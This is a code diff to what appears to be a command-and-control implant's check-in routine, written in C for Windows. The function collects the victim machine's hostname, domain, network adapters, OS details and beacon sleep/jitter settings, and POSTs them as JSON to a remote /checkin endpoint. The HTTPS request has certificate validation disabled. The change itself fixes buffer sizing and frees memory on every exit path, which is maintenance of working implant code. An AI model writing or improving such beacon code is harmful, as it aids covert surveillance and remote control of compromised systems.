@@ -1,5 +1,6 @@
 #include <beacon.h>
 #include <stdio.h>
+#include <string.h>
 
 static void wchar_to_utf8(const wchar_t *src, char *dst, int dst_size) {
     WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dst_size, NULL, NULL);
@@ -21,9 +22,15 @@ void beacon_checkin(BEACON_CTX *ctx) {
     wchar_to_utf8(ctx->hostname,     hname,     sizeof(hname));
     wchar_to_utf8(ctx->domain,       dom,       sizeof(dom));
 
-    const char *adapters = ctx->adapters ? ctx->adapters : "[]";
-    char json[8192];
-    snprintf(json, sizeof(json),
+    const char *adapters    = ctx->adapters ? ctx->adapters : "[]";
+    size_t      adapters_ln = strlen(adapters);
+
+    /* dynamic JSON buffer sized to actual content */
+    size_t json_sz = adapters_ln + 1024;
+    char  *json    = (char *)HeapAlloc(GetProcessHeap(), 0, json_sz);
+    if (!json) return;
+
+    snprintf(json, json_sz,
         "{\"beacon_id\":%lu,\"sleep_ms\":%lu,\"jitter_pct\":%lu,"
         "\"eip\":\"%s\",\"adapters\":%s,"
         "\"os_version\":\"%s\",\"os_build\":%lu,\"arch\":\"%s\","
@@ -46,16 +53,25 @@ void beacon_checkin(BEACON_CTX *ctx) {
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME,
                                      WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) return;
+    if (!hSession) { HeapFree(GetProcessHeap(), 0, json); return; }
 
     HINTERNET hConnect = WinHttpConnect(hSession, ctx->host, ctx->port, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return; }
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        HeapFree(GetProcessHeap(), 0, json);
+        return;
+    }
 
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/checkin",
                                              NULL, WINHTTP_NO_REFERER,
                                              WINHTTP_DEFAULT_ACCEPT_TYPES,
                                              WINHTTP_FLAG_SECURE);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        HeapFree(GetProcessHeap(), 0, json);
+        return;
+    }
 
     tls_ignore(hRequest);
 
@@ -67,4 +83,5 @@ void beacon_checkin(BEACON_CTX *ctx) {
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
+    HeapFree(GetProcessHeap(), 0, json);
 }
